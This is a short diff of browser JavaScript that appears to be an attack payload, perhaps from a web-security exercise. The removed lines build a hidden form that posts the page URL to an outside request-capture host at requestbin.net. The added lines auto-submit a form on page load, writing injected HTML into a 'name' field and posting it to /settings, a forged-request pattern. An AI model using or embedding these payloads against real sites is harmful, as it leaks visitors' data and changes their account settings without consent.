@@ -1,5 +1,6 @@
-
-f=document.createElement("form");
-i=document.createElement("input");
-f.method='post';f.action='http://requestbin.net/r/rj93qcrj';
-i.name='data';i.value=document.location.href;f.appendChild(i);document.body.appendChild(f);f.submit();
+window.addEventListener('load', function () {
+  
+    document.getElementById("name").value = "<b>Hello</b>";
+    document.forms[0].action="/settings";
+    document.forms[0].submit();
+   })
